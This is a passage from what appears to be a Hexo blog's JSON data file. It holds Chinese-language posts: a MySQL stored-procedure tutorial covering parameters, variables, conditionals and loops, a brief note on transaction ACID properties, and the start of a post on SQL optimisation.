BEGIN\n\t\tIF input BETWEEN 0 AND 60 THEN\n\t\t    SELECT \"L\" AS GRADE;\n\t\tELSEIF input BETWEEN 60 AND 80 THEN\n\t\t    SELECT \"M\" AS GRADE;\n\t\tELSEIF input BETWEEN 80 AND 100 THEN\n\t\t    SELECT \"H\" AS GRADE;\n\t\tELSE\n\t\t    SELECT \"Error\" AS Warning;\n\t\tEND IF;\n\t    END $$\n\tDELIMITER ;\n\n\tSET @input = 90;\n\tCALL conditional(@input);\n\n#### 存储过程中的条件语句：CASE -- WHEN THEN\n\n\tDELIMITER $$\n\tDROP PROCEDURE IF EXISTS conditional2;\n\tCREATE PROCEDURE conditional2(IN case_val INT)\n\t    BEGIN\n\t\tCASE case_val\n\t\t    WHEN 20 THEN\n\t\t        SELECT \"L\" AS GRADE;\n\t\t    WHEN 30 THEN\n\t\t        SELECT \"M\" AS GRADE;\n\t\t    WHEN 40 THEN\n\t\t        SELECT \"H\" AS GRADE;\n\t\t    ELSE\n\t\t        SELECT \"ERROR\" AS Warning;\n\t\tEND CASE ;\n\t    END $$\n\n\tDELIMITER ;\n\n\tSET @case_val = 30;\n\tCALL conditional2(@case_val);\n\n#### 存储过程中的循环语句(先判断后执行)：WHILE DO -- END WHILE\n\t\n\tDELIMITER $$\n\tDROP PROCEDURE IF EXISTS loop1;\n\tCREATE PROCEDURE loop1(IN loop_val INT)\n\t    BEGIN\n\t\tWHILE loop_val > 10 DO\n\t\t    -- doing something\n\t\tEND WHILE;\n\t    END $$\n\tDELIMITER ;\n\n#### 存储过程中的循环语句(先执行后判断)：REPEAT -- UNTIL -- END REPEAT\n\n\tDELIMITER $$\n\tDROP PROCEDURE IF EXISTS loop1;\n\tCREATE PROCEDURE loop1(IN loop_val INT)\n\t    BEGIN\n\t\tREPEAT\n\t\t    -- doing something\n\t\t    UNTIL  loop_val > 10\n\t\tEND REPEAT;\n\t    END $$\n\tDELIMITER ;\n\n\n#### 存储过程中的循环语句：LOOP -- LEAVE -- END LOOP\n\t\n\tDELIMITER $$\n\tDROP PROCEDURE IF EXISTS loop1;\n\tCREATE PROCEDURE loop1(IN loop_val INT)\n\t    BEGIN\n\t\tlabel:LOOP\n\t\t    if loop_val > 10 THEN\n\t\t        -- 跳出循环\n\t\t        LEAVE label;\n\t\t    ELSEIF loop_val > 20 THEN\n\t\t        -- 跳出本次循环执行下一次循环\n\t\t        ITERATE label;\n\t\t    END IF;\n\t\tEND LOOP;\n\t    END $$\n\tDELIMITER ;\n\n#### 查看存储过程的状态：\n\n\tSHOW PROCEDURE STATUS LIKE 'conditional1';\n\n\tSHOW PROCEDURE STATUS LIKE 'conditional%';\n#### 查看存储过程定义相关信息\n\n\tSHOW CREATE PROCEDURE conditional1;\n\n#### 修改存储过程的特征参数（MySQL中不支持修改存储过程的内容）：\n\n\tALTER PROCEDURE conditional1 SQL SECURITY DEFINER ; -- 修改存储过程的调用者（INVOKER \\ DEFINER）\n\n#### 删除存储过程\n\n\tDROP PROCEDURE conditional1;","slug":"MySQL存储过程入门教程","published":1,"updated":"2018-02-08T01:25:54.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44tw40014mfahh6zafgxv","content":"<p>[TOC]</p>\n<h4 id=\"什么是存储过程？\"><a href=\"#什么是存储过程？\" class=\"headerlink\" title=\"什么是存储过程？\"></a>什么是存储过程？</h4><p>存储过程是存储在MySQL数据库中的已经经过编译好的SQL指令集。</p>\n<h4 id=\"存储过程的特点：\"><a href=\"#存储过程的特点：\" class=\"headerlink\" title=\"存储过程的特点：\"></a>存储过程的特点：</h4><ul>\n<li>因此执行时不需要数据库进行编译、优化就可以直接运行，相比直接执行SQL语句而言省去了编译和优化的环节，从而节省了系统的消耗。</li>\n<li>触发器是在对数据库中数据进行增删改的时候触发执行的，是一个自动的过程。</li>\n<li>存储过程能将对多个表的复杂操作封装到一起，结合MySQL事务进行执行。如果用程序来执行，那就变成了多次执行单条SQL语句，执行</li>\n<li>过程中不仅每次需要数据库进行编译、优化，而且需要多次连接数据库，十分消耗性能。</li>\n<li><p>存储过程能对数据库的访问权限进行细化。</p>\n<h4 id=\"什么情况下应该使用存储过程？\"><a href=\"#什么情况下应该使用存储过程？\" class=\"headerlink\" title=\"什么情况下应该使用存储过程？\"></a>什么情况下应该使用存储过程？</h4></li>\n<li><p>存储过程的使用要根据项目实际情况来决定。并非将所有的业务逻辑都封装成存储过程就好。因为存储过程的移植性差，不同的数据库对于存储过程的实现语法都存在差异。</p>\n</li>\n<li>不要将大量的运算放在存储过程中去，因为高并发下，多个用户访问，数据库的运算量会激增，导致数据库压力过大，不如将所有的计算放在web端。</li>\n<li>针对并发量大的web项目，不建议大量使用存储过程，原因如上。如果要是用，请控制存储过程的复杂程度，逻辑越简单越好。</li>\n</ul>\n<h4 id=\"定义一个存储过程\"><a href=\"#定义一个存储过程\" class=\"headerlink\" title=\"定义一个存储过程\"></a>定义一个存储过程</h4><pre><code>DELIMITER $$\nDROP PROCEDURE IF EXISTS countRow;\nCREATE PROCEDURE countRow(OUT num INT)\n    BEGIN\n      SELECT COUNT(*) INTO num FROM mysql.user;\n    END $$\n\nDELIMITER ;\n-- 调用存储过程\nCALL countRow(@s);\nSELECT @s as num;\n</code></pre><h4 id=\"存储过程参数：IN-参数\"><a href=\"#存储过程参数：IN-参数\" class=\"headerlink\" title=\"存储过程参数：IN 参数\"></a>存储过程参数：IN 参数</h4><pre><code>-- IN 类型的参数表示在调用的时候需要传入实际值，该值的作用域仅限于存储过程内部，不会对外输出该值\nDELIMITER $$\nDROP PROCEDURE IF EXISTS paramIn;\nCREATE PROCEDURE paramIn(IN p_in INT)\n    BEGIN\n      SELECT p_in AS init_val;\n      SET p_in = 100;\n      SELECT p_in AS update_val;\n    END $$\n\nDELIMITER ;\n\n-- 定义一个用户变量\nSET @p_in = 11;\n-- 查询变量的初始值\nSELECT @p_in;\n-- 调用存储过程\nCALL paramIn(@p_in);\n-- 在此查看用户变量的值是否仍为11\nSELECT @p_in;\n</code></pre><h4 id=\"存储过程参数：OUT-参数\"><a href=\"#存储过程参数：OUT-参数\" class=\"headerlink\" title=\"存储过程参数：OUT 参数\"></a>存储过程参数：OUT 参数</h4><pre><code>-- OUT 类型的参数表示在调用的时候不能传入外部值，该值由存储过程在内部赋值之后返回给外部，可以在外部访问\nDELIMITER $$\nDROP PROCEDURE IF EXISTS paramOut;\nCREATE PROCEDURE paramOut(OUT p_out INT)\n    BEGIN\n    SELECT p_out AS init_val;\n#         SET p_out = 200;\n#         SELECT p_out AS update_val;\n    END $$\nDELIMITER ;\n\n-- 定义一个用户变量\nSET @p_out = 22;\n-- 查询变量的初始值\nSELECT @p_out;\n-- 调用存储过程\nCALL paramOut(@p_out);\n-- 在此查看用户变量的值是否已经变成200\nSELECT @p_out;\n</code></pre><h4 id=\"存储过程参数：INOUT-参数\"><a href=\"#存储过程参数：INOUT-参数\" class=\"headerlink\" title=\"存储过程参数：INOUT 参数\"></a>存储过程参数：INOUT 参数</h4><pre><code>-- NOUT 类型的参数表示在调用存储过程的时候可以接收外部传入的参数值，执行完后也能将新值传出\nDELIMITER $$\nDROP PROCEDURE IF EXISTS paramInout;\nCREATE PROCEDURE paramInout(INOUT p_inout INT)\n    BEGIN\n      SELECT p_inout AS init_val;\n      SET p_inout = 300;\n      SELECT p_inout AS update_val;\n    END $$\n\nDELIMITER ;\n\n-- 定义一个用户变量\nSET @p_inout = 33;\n-- 查询变量的初始值\nSELECT @p_inout;\n-- 调用存储过程\nCALL paramInout(@p_inout);\n-- 在此查看用户变量的值是否已经变成200\nSELECT @p_inout;\n</code></pre><h4 id=\"存储过程参数：不指定参数类型\"><a href=\"#存储过程参数：不指定参数类型\" class=\"headerlink\" title=\"存储过程参数：不指定参数类型\"></a>存储过程参数：不指定参数类型</h4><pre><code>DELIMITER $$\nDROP PROCEDURE IF EXISTS paramDefault;\nCREATE PROCEDURE paramDefault(p_default INT)\n    BEGIN\n    SELECT p_default AS init_val;\n    SET p_default = 400;\n    SELECT p_default AS update_val;\n    END $$\n\nDELIMITER ;\n\n-- 定义一个用户变量\nSET @p_default = 44;\n-- 查询变量的初始值\nSELECT @p_default;\n-- 调用存储过程\nCALL paramDefault(@p_default);\n-- 在此查看用户变量的值是否仍是44\nSELECT @p_default;\n</code></pre><h4 id=\"总结：\"><a href=\"#总结：\" class=\"headerlink\" title=\"总结：\"></a>总结：</h4><p>以存储过程为中心，IN 表示能将值传入到存储过程中，但是不能传出去； OUT 表示不能将值传入到存储过程中，但是能将值传出到外部；INOUT 表示能将值传入到存储过程中，执行完成后也能将值传出到外部；如果不指定参数类型，默认为 IN。</p>\n<h4 id=\"存储过程中变量的定义：使用-DECLARE-关键字\"><a href=\"#存储过程中变量的定义：使用-DECLARE-关键字\" class=\"headerlink\" title=\"存储过程中变量的定义：使用 DECLARE 关键字\"></a>存储过程中变量的定义：使用 DECLARE 关键字</h4><pre><code>DELIMITER $$\nDROP PROCEDURE IF EXISTS variableDefine;\nCREATE PROCEDURE variableDefine()\n    BEGIN\n    -- 定义变量的格式：DECLARE 变量名 数据类型 （默认值可选）\n    DECLARE variableName VARCHAR(20) DEFAULT &quot;defaultName&quot;;\n\n    -- 变量赋值格式：SET 变量名 = 变量值\n    SET variableName = &quot;signedValue&quot;;\n\n    SELECT CONCAT(&quot;the new value is:&quot;, variableName) AS name;\n    END $$\n\nDELIMITER ;\n\nCALL variableDefine();\n</code></pre><h4 id=\"存储过程中的变量作用域：详见IN、-OUT、-INOUT\"><a href=\"#存储过程中的变量作用域：详见IN、-OUT、-INOUT\" class=\"headerlink\" title=\"存储过程中的变量作用域：详见IN、 OUT、 INOUT\"></a>存储过程中的变量作用域：详见IN、 OUT、 INOUT</h4><h4 id=\"存储过程中的条件语句：IF-–-ELSEIF-–-ELSE-–-END-IF\"><a href=\"#存储过程中的条件语句：IF-–-ELSEIF-–-ELSE-–-END-IF\" class=\"headerlink\" title=\"存储过程中的条件语句：IF – ELSEIF – ELSE – END IF\"></a>存储过程中的条件语句：IF – ELSEIF – ELSE – END IF</h4><pre><code>DELIMITER $$\nDROP PROCEDURE IF EXISTS conditional1;\nCREATE PROCEDURE conditional1(IN input INT)\n    BEGIN\n    IF input BETWEEN 0 AND 60 THEN\n        SELECT &quot;L&quot; AS GRADE;\n    ELSEIF input BETWEEN 60 AND 80 THEN\n        SELECT &quot;M&quot; AS GRADE;\n    ELSEIF input BETWEEN 80 AND 100 THEN\n        SELECT &quot;H&quot; AS GRADE;\n    ELSE\n        SELECT &quot;Error&quot; AS Warning;\n    END IF;\n    END $$\nDELIMITER ;\n\nSET @input = 90;\nCALL conditional(@input);\n</code></pre><h4 id=\"存储过程中的条件语句：CASE-–-WHEN-THEN\"><a href=\"#存储过程中的条件语句：CASE-–-WHEN-THEN\" class=\"headerlink\" title=\"存储过程中的条件语句：CASE – WHEN THEN\"></a>存储过程中的条件语句：CASE – WHEN THEN</h4><pre><code>DELIMITER $$\nDROP PROCEDURE IF EXISTS conditional2;\nCREATE PROCEDURE conditional2(IN case_val INT)\n    BEGIN\n    CASE case_val\n        WHEN 20 THEN\n            SELECT &quot;L&quot; AS GRADE;\n        WHEN 30 THEN\n            SELECT &quot;M&quot; AS GRADE;\n        WHEN 40 THEN\n            SELECT &quot;H&quot; AS GRADE;\n        ELSE\n            SELECT &quot;ERROR&quot; AS Warning;\n    END CASE ;\n    END $$\n\nDELIMITER ;\n\nSET @case_val = 30;\nCALL conditional2(@case_val);\n</code></pre><h4 id=\"存储过程中的循环语句-先判断后执行-：WHILE-DO-–-END-WHILE\"><a href=\"#存储过程中的循环语句-先判断后执行-：WHILE-DO-–-END-WHILE\" class=\"headerlink\" title=\"存储过程中的循环语句(先判断后执行)：WHILE DO – END WHILE\"></a>存储过程中的循环语句(先判断后执行)：WHILE DO – END WHILE</h4><pre><code>DELIMITER $$\nDROP PROCEDURE IF EXISTS loop1;\nCREATE PROCEDURE loop1(IN loop_val INT)\n    BEGIN\n    WHILE loop_val &gt; 10 DO\n        -- doing something\n    END WHILE;\n    END $$\nDELIMITER ;\n</code></pre><h4 id=\"存储过程中的循环语句-先执行后判断-：REPEAT-–-UNTIL-–-END-REPEAT\"><a href=\"#存储过程中的循环语句-先执行后判断-：REPEAT-–-UNTIL-–-END-REPEAT\" class=\"headerlink\" title=\"存储过程中的循环语句(先执行后判断)：REPEAT – UNTIL – END REPEAT\"></a>存储过程中的循环语句(先执行后判断)：REPEAT – UNTIL – END REPEAT</h4><pre><code>DELIMITER $$\nDROP PROCEDURE IF EXISTS loop1;\nCREATE PROCEDURE loop1(IN loop_val INT)\n    BEGIN\n    REPEAT\n        -- doing something\n        UNTIL  loop_val &gt; 10\n    END REPEAT;\n    END $$\nDELIMITER ;\n</code></pre><h4 id=\"存储过程中的循环语句：LOOP-–-LEAVE-–-END-LOOP\"><a href=\"#存储过程中的循环语句：LOOP-–-LEAVE-–-END-LOOP\" class=\"headerlink\" title=\"存储过程中的循环语句：LOOP – LEAVE – END LOOP\"></a>存储过程中的循环语句：LOOP – LEAVE – END LOOP</h4><pre><code>DELIMITER $$\nDROP PROCEDURE IF EXISTS loop1;\nCREATE PROCEDURE loop1(IN loop_val INT)\n    BEGIN\n    label:LOOP\n        if loop_val &gt; 10 THEN\n            -- 跳出循环\n            LEAVE label;\n        ELSEIF loop_val &gt; 20 THEN\n            -- 跳出本次循环执行下一次循环\n            ITERATE label;\n        END IF;\n    END LOOP;\n    END $$\nDELIMITER ;\n</code></pre><h4 id=\"查看存储过程的状态：\"><a href=\"#查看存储过程的状态：\" class=\"headerlink\" title=\"查看存储过程的状态：\"></a>查看存储过程的状态：</h4><pre><code>SHOW PROCEDURE STATUS LIKE &apos;conditional1&apos;;\n\nSHOW PROCEDURE STATUS LIKE &apos;conditional%&apos;;\n</code></pre><h4 id=\"查看存储过程定义相关信息\"><a href=\"#查看存储过程定义相关信息\" class=\"headerlink\" title=\"查看存储过程定义相关信息\"></a>查看存储过程定义相关信息</h4><pre><code>SHOW CREATE PROCEDURE conditional1;\n</code></pre><h4 id=\"修改存储过程的特征参数（MySQL中不支持修改存储过程的内容）：\"><a href=\"#修改存储过程的特征参数（MySQL中不支持修改存储过程的内容）：\" class=\"headerlink\" title=\"修改存储过程的特征参数（MySQL中不支持修改存储过程的内容）：\"></a>修改存储过程的特征参数（MySQL中不支持修改存储过程的内容）：</h4><pre><code>ALTER PROCEDURE conditional1 SQL SECURITY DEFINER ; -- 修改存储过程的调用者（INVOKER \\ DEFINER）\n</code></pre><h4 id=\"删除存储过程\"><a href=\"#删除存储过程\" class=\"headerlink\" title=\"删除存储过程\"></a>删除存储过程</h4><pre><code>DROP PROCEDURE conditional1;\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<p>[TOC]</p>\n<h4 id=\"什么是存储过程？\"><a href=\"#什么是存储过程？\" class=\"headerlink\" title=\"什么是存储过程？\"></a>什么是存储过程？</h4><p>存储过程是存储在MySQL数据库中的已经经过编译好的SQL指令集。</p>\n<h4 id=\"存储过程的特点：\"><a href=\"#存储过程的特点：\" class=\"headerlink\" title=\"存储过程的特点：\"></a>存储过程的特点：</h4><ul>\n<li>因此执行时不需要数据库进行编译、优化就可以直接运行，相比直接执行SQL语句而言省去了编译和优化的环节，从而节省了系统的消耗。</li>\n<li>触发器是在对数据库中数据进行增删改的时候触发执行的，是一个自动的过程。</li>\n<li>存储过程能将对多个表的复杂操作封装到一起，结合MySQL事务进行执行。如果用程序来执行，那就变成了多次执行单条SQL语句，执行</li>\n<li>过程中不仅每次需要数据库进行编译、优化，而且需要多次连接数据库，十分消耗性能。</li>\n<li><p>存储过程能对数据库的访问权限进行细化。</p>\n<h4 id=\"什么情况下应该使用存储过程？\"><a href=\"#什么情况下应该使用存储过程？\" class=\"headerlink\" title=\"什么情况下应该使用存储过程？\"></a>什么情况下应该使用存储过程？</h4></li>\n<li><p>存储过程的使用要根据项目实际情况来决定。并非将所有的业务逻辑都封装成存储过程就好。因为存储过程的移植性差，不同的数据库对于存储过程的实现语法都存在差异。</p>\n</li>\n<li>不要将大量的运算放在存储过程中去，因为高并发下，多个用户访问，数据库的运算量会激增，导致数据库压力过大，不如将所有的计算放在web端。</li>\n<li>针对并发量大的web项目，不建议大量使用存储过程，原因如上。如果要是用，请控制存储过程的复杂程度，逻辑越简单越好。</li>\n</ul>\n<h4 id=\"定义一个存储过程\"><a href=\"#定义一个存储过程\" class=\"headerlink\" title=\"定义一个存储过程\"></a>定义一个存储过程</h4><pre><code>DELIMITER $$\nDROP PROCEDURE IF EXISTS countRow;\nCREATE PROCEDURE countRow(OUT num INT)\n    BEGIN\n      SELECT COUNT(*) INTO num FROM mysql.user;\n    END $$\n\nDELIMITER ;\n-- 调用存储过程\nCALL countRow(@s);\nSELECT @s as num;\n</code></pre><h4 id=\"存储过程参数：IN-参数\"><a href=\"#存储过程参数：IN-参数\" class=\"headerlink\" title=\"存储过程参数：IN 参数\"></a>存储过程参数：IN 参数</h4><pre><code>-- IN 类型的参数表示在调用的时候需要传入实际值，该值的作用域仅限于存储过程内部，不会对外输出该值\nDELIMITER $$\nDROP PROCEDURE IF EXISTS paramIn;\nCREATE PROCEDURE paramIn(IN p_in INT)\n    BEGIN\n      SELECT p_in AS init_val;\n      SET p_in = 100;\n      SELECT p_in AS update_val;\n    END $$\n\nDELIMITER ;\n\n-- 定义一个用户变量\nSET @p_in = 11;\n-- 查询变量的初始值\nSELECT @p_in;\n-- 调用存储过程\nCALL paramIn(@p_in);\n-- 在此查看用户变量的值是否仍为11\nSELECT @p_in;\n</code></pre><h4 id=\"存储过程参数：OUT-参数\"><a href=\"#存储过程参数：OUT-参数\" class=\"headerlink\" title=\"存储过程参数：OUT 参数\"></a>存储过程参数：OUT 参数</h4><pre><code>-- OUT 类型的参数表示在调用的时候不能传入外部值，该值由存储过程在内部赋值之后返回给外部，可以在外部访问\nDELIMITER $$\nDROP PROCEDURE IF EXISTS paramOut;\nCREATE PROCEDURE paramOut(OUT p_out INT)\n    BEGIN\n    SELECT p_out AS init_val;\n#         SET p_out = 200;\n#         SELECT p_out AS update_val;\n    END $$\nDELIMITER ;\n\n-- 定义一个用户变量\nSET @p_out = 22;\n-- 查询变量的初始值\nSELECT @p_out;\n-- 调用存储过程\nCALL paramOut(@p_out);\n-- 在此查看用户变量的值是否已经变成200\nSELECT @p_out;\n</code></pre><h4 id=\"存储过程参数：INOUT-参数\"><a href=\"#存储过程参数：INOUT-参数\" class=\"headerlink\" title=\"存储过程参数：INOUT 参数\"></a>存储过程参数：INOUT 参数</h4><pre><code>-- NOUT 类型的参数表示在调用存储过程的时候可以接收外部传入的参数值，执行完后也能将新值传出\nDELIMITER $$\nDROP PROCEDURE IF EXISTS paramInout;\nCREATE PROCEDURE paramInout(INOUT p_inout INT)\n    BEGIN\n      SELECT p_inout AS init_val;\n      SET p_inout = 300;\n      SELECT p_inout AS update_val;\n    END $$\n\nDELIMITER ;\n\n-- 定义一个用户变量\nSET @p_inout = 33;\n-- 查询变量的初始值\nSELECT @p_inout;\n-- 调用存储过程\nCALL paramInout(@p_inout);\n-- 在此查看用户变量的值是否已经变成200\nSELECT @p_inout;\n</code></pre><h4 id=\"存储过程参数：不指定参数类型\"><a href=\"#存储过程参数：不指定参数类型\" class=\"headerlink\" title=\"存储过程参数：不指定参数类型\"></a>存储过程参数：不指定参数类型</h4><pre><code>DELIMITER $$\nDROP PROCEDURE IF EXISTS paramDefault;\nCREATE PROCEDURE paramDefault(p_default INT)\n    BEGIN\n    SELECT p_default AS init_val;\n    SET p_default = 400;\n    SELECT p_default AS update_val;\n    END $$\n\nDELIMITER ;\n\n-- 定义一个用户变量\nSET @p_default = 44;\n-- 查询变量的初始值\nSELECT @p_default;\n-- 调用存储过程\nCALL paramDefault(@p_default);\n-- 在此查看用户变量的值是否仍是44\nSELECT @p_default;\n</code></pre><h4 id=\"总结：\"><a href=\"#总结：\" class=\"headerlink\" title=\"总结：\"></a>总结：</h4><p>以存储过程为中心，IN 表示能将值传入到存储过程中，但是不能传出去； OUT 表示不能将值传入到存储过程中，但是能将值传出到外部；INOUT 表示能将值传入到存储过程中，执行完成后也能将值传出到外部；如果不指定参数类型，默认为 IN。</p>\n<h4 id=\"存储过程中变量的定义：使用-DECLARE-关键字\"><a href=\"#存储过程中变量的定义：使用-DECLARE-关键字\" class=\"headerlink\" title=\"存储过程中变量的定义：使用 DECLARE 关键字\"></a>存储过程中变量的定义：使用 DECLARE 关键字</h4><pre><code>DELIMITER $$\nDROP PROCEDURE IF EXISTS variableDefine;\nCREATE PROCEDURE variableDefine()\n    BEGIN\n    -- 定义变量的格式：DECLARE 变量名 数据类型 （默认值可选）\n    DECLARE variableName VARCHAR(20) DEFAULT &quot;defaultName&quot;;\n\n    -- 变量赋值格式：SET 变量名 = 变量值\n    SET variableName = &quot;signedValue&quot;;\n\n    SELECT CONCAT(&quot;the new value is:&quot;, variableName) AS name;\n    END $$\n\nDELIMITER ;\n\nCALL variableDefine();\n</code></pre><h4 id=\"存储过程中的变量作用域：详见IN、-OUT、-INOUT\"><a href=\"#存储过程中的变量作用域：详见IN、-OUT、-INOUT\" class=\"headerlink\" title=\"存储过程中的变量作用域：详见IN、 OUT、 INOUT\"></a>存储过程中的变量作用域：详见IN、 OUT、 INOUT</h4><h4 id=\"存储过程中的条件语句：IF-–-ELSEIF-–-ELSE-–-END-IF\"><a href=\"#存储过程中的条件语句：IF-–-ELSEIF-–-ELSE-–-END-IF\" class=\"headerlink\" title=\"存储过程中的条件语句：IF – ELSEIF – ELSE – END IF\"></a>存储过程中的条件语句：IF – ELSEIF – ELSE – END IF</h4><pre><code>DELIMITER $$\nDROP PROCEDURE IF EXISTS conditional1;\nCREATE PROCEDURE conditional1(IN input INT)\n    BEGIN\n    IF input BETWEEN 0 AND 60 THEN\n        SELECT &quot;L&quot; AS GRADE;\n    ELSEIF input BETWEEN 60 AND 80 THEN\n        SELECT &quot;M&quot; AS GRADE;\n    ELSEIF input BETWEEN 80 AND 100 THEN\n        SELECT &quot;H&quot; AS GRADE;\n    ELSE\n        SELECT &quot;Error&quot; AS Warning;\n    END IF;\n    END $$\nDELIMITER ;\n\nSET @input = 90;\nCALL conditional(@input);\n</code></pre><h4 id=\"存储过程中的条件语句：CASE-–-WHEN-THEN\"><a href=\"#存储过程中的条件语句：CASE-–-WHEN-THEN\" class=\"headerlink\" title=\"存储过程中的条件语句：CASE – WHEN THEN\"></a>存储过程中的条件语句：CASE – WHEN THEN</h4><pre><code>DELIMITER $$\nDROP PROCEDURE IF EXISTS conditional2;\nCREATE PROCEDURE conditional2(IN case_val INT)\n    BEGIN\n    CASE case_val\n        WHEN 20 THEN\n            SELECT &quot;L&quot; AS GRADE;\n        WHEN 30 THEN\n            SELECT &quot;M&quot; AS GRADE;\n        WHEN 40 THEN\n            SELECT &quot;H&quot; AS GRADE;\n        ELSE\n            SELECT &quot;ERROR&quot; AS Warning;\n    END CASE ;\n    END $$\n\nDELIMITER ;\n\nSET @case_val = 30;\nCALL conditional2(@case_val);\n</code></pre><h4 id=\"存储过程中的循环语句-先判断后执行-：WHILE-DO-–-END-WHILE\"><a href=\"#存储过程中的循环语句-先判断后执行-：WHILE-DO-–-END-WHILE\" class=\"headerlink\" title=\"存储过程中的循环语句(先判断后执行)：WHILE DO – END WHILE\"></a>存储过程中的循环语句(先判断后执行)：WHILE DO – END WHILE</h4><pre><code>DELIMITER $$\nDROP PROCEDURE IF EXISTS loop1;\nCREATE PROCEDURE loop1(IN loop_val INT)\n    BEGIN\n    WHILE loop_val &gt; 10 DO\n        -- doing something\n    END WHILE;\n    END $$\nDELIMITER ;\n</code></pre><h4 id=\"存储过程中的循环语句-先执行后判断-：REPEAT-–-UNTIL-–-END-REPEAT\"><a href=\"#存储过程中的循环语句-先执行后判断-：REPEAT-–-UNTIL-–-END-REPEAT\" class=\"headerlink\" title=\"存储过程中的循环语句(先执行后判断)：REPEAT – UNTIL – END REPEAT\"></a>存储过程中的循环语句(先执行后判断)：REPEAT – UNTIL – END REPEAT</h4><pre><code>DELIMITER $$\nDROP PROCEDURE IF EXISTS loop1;\nCREATE PROCEDURE loop1(IN loop_val INT)\n    BEGIN\n    REPEAT\n        -- doing something\n        UNTIL  loop_val &gt; 10\n    END REPEAT;\n    END $$\nDELIMITER ;\n</code></pre><h4 id=\"存储过程中的循环语句：LOOP-–-LEAVE-–-END-LOOP\"><a href=\"#存储过程中的循环语句：LOOP-–-LEAVE-–-END-LOOP\" class=\"headerlink\" title=\"存储过程中的循环语句：LOOP – LEAVE – END LOOP\"></a>存储过程中的循环语句：LOOP – LEAVE – END LOOP</h4><pre><code>DELIMITER $$\nDROP PROCEDURE IF EXISTS loop1;\nCREATE PROCEDURE loop1(IN loop_val INT)\n    BEGIN\n    label:LOOP\n        if loop_val &gt; 10 THEN\n            -- 跳出循环\n            LEAVE label;\n        ELSEIF loop_val &gt; 20 THEN\n            -- 跳出本次循环执行下一次循环\n            ITERATE label;\n        END IF;\n    END LOOP;\n    END $$\nDELIMITER ;\n</code></pre><h4 id=\"查看存储过程的状态：\"><a href=\"#查看存储过程的状态：\" class=\"headerlink\" title=\"查看存储过程的状态：\"></a>查看存储过程的状态：</h4><pre><code>SHOW PROCEDURE STATUS LIKE &apos;conditional1&apos;;\n\nSHOW PROCEDURE STATUS LIKE &apos;conditional%&apos;;\n</code></pre><h4 id=\"查看存储过程定义相关信息\"><a href=\"#查看存储过程定义相关信息\" class=\"headerlink\" title=\"查看存储过程定义相关信息\"></a>查看存储过程定义相关信息</h4><pre><code>SHOW CREATE PROCEDURE conditional1;\n</code></pre><h4 id=\"修改存储过程的特征参数（MySQL中不支持修改存储过程的内容）：\"><a href=\"#修改存储过程的特征参数（MySQL中不支持修改存储过程的内容）：\" class=\"headerlink\" title=\"修改存储过程的特征参数（MySQL中不支持修改存储过程的内容）：\"></a>修改存储过程的特征参数（MySQL中不支持修改存储过程的内容）：</h4><pre><code>ALTER PROCEDURE conditional1 SQL SECURITY DEFINER ; -- 修改存储过程的调用者（INVOKER \\ DEFINER）\n</code></pre><h4 id=\"删除存储过程\"><a href=\"#删除存储过程\" class=\"headerlink\" title=\"删除存储过程\"></a>删除存储过程</h4><pre><code>DROP PROCEDURE conditional1;\n</code></pre>"},{"title":"MySql数据库的事务","date":"2018-01-31T07:20:20.000Z","_content":"#### 事务的四大特性：\n**原子性：**共同成败\n**一致性：**事务前后数据不会损坏，保持原有的完整性\n**隔离性：**事务之间互不干扰\n**持久性：**一旦事务提交，数据就永远的保存到了数据库中\n\n不考虑事务的隔离性会发生：脏读，不可重复读，虚读幻读\n\n解决上述问题的方式是：设置数据库的隔离级别","source":"_posts/MySql数据库的事务.md","raw":"---\ntitle: MySql数据库的事务\ndate: 2018-01-31 15:20:20\ntags: MySql\n---\n#### 事务的四大特性：\n**原子性：**共同成败\n**一致性：**事务前后数据不会损坏，保持原有的完整性\n**隔离性：**事务之间互不干扰\n**持久性：**一旦事务提交，数据就永远的保存到了数据库中\n\n不考虑事务的隔离性会发生：脏读，不可重复读，虚读幻读\n\n解决上述问题的方式是：设置数据库的隔离级别","slug":"MySql数据库的事务","published":1,"updated":"2018-02-09T08:21:44.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44tw50016mfahzw2cjona","content":"<h4 id=\"事务的四大特性：\"><a href=\"#事务的四大特性：\" class=\"headerlink\" title=\"事务的四大特性：\"></a>事务的四大特性：</h4><p><strong>原子性：</strong>共同成败<br><strong>一致性：</strong>事务前后数据不会损坏，保持原有的完整性<br><strong>隔离性：</strong>事务之间互不干扰<br><strong>持久性：</strong>一旦事务提交，数据就永远的保存到了数据库中</p>\n<p>不考虑事务的隔离性会发生：脏读，不可重复读，虚读幻读</p>\n<p>解决上述问题的方式是：设置数据库的隔离级别</p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"事务的四大特性：\"><a href=\"#事务的四大特性：\" class=\"headerlink\" title=\"事务的四大特性：\"></a>事务的四大特性：</h4><p><strong>原子性：</strong>共同成败<br><strong>一致性：</strong>事务前后数据不会损坏，保持原有的完整性<br><strong>隔离性：</strong>事务之间互不干扰<br><strong>持久性：</strong>一旦事务提交，数据就永远的保存到了数据库中</p>\n<p>不考虑事务的隔离性会发生：脏读，不可重复读，虚读幻读</p>\n<p>解决上述问题的方式是：设置数据库的隔离级别</p>\n"},{"title":"MySql优化","date":"2017-09-22T06:53:18.000Z","_content":"引言：在谈到到Sql优化问题时，我非常赞同”Sql优化永无止境“这句话。\n#### MySql优化：\n\n在一些大型网站项目中，数据库的并发量往往成为了整个应用的瓶颈问题。为了提高网站的并发量，就需要提高数据库的查询效率。\n那么如何才能提高数据库的查询效率呢？这就是我今天要研究的主题：Sql优化。\n\nSql优化的几个方面：\n\n- 代码优化：\n\t- 代码中减少多次连接数据库进行查询，应该将多次查询封装成一条SQL进行查询，减少IO消耗；\n\t- 避免使用 ‘SELECT * ’，查询结果中的冗余字段会增加了IO消耗。\n\t\n- 建表优化：\n\t- 